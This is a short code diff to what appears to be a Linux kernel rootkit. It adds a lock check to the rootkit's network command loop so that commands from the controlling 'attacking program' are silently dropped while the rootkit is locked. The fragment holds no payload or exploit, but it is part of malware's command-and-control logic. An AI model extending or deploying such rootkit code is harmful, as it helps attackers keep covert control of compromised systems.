@@ -8,6 +8,7 @@
 
 #include "commands.h"
 #include "hook.h"
+#include "lock.h"
 
 static struct socket *sock = NULL;
 
@@ -157,6 +158,16 @@ int network_loop(void *data)
         }
 
         memset(&resp_buf, 0, 1024);
+        /* WARNING: rootkit silently ignores commands when locked. It is up to
+         * the attacking program to track locked state and prevent the user from
+         * sending other commands types */
+        if (lock_status() == LOCKED && cmd.type != CMD_UNLOCK)
+        {
+            pr_info("network: rootkit is locked, dropping command %d\n",
+                    cmd.type);
+            continue;
+        }
+
         if ((ret = cmd.callback(sock, cmd.args) != 0))
         {
             if (ret != -1)
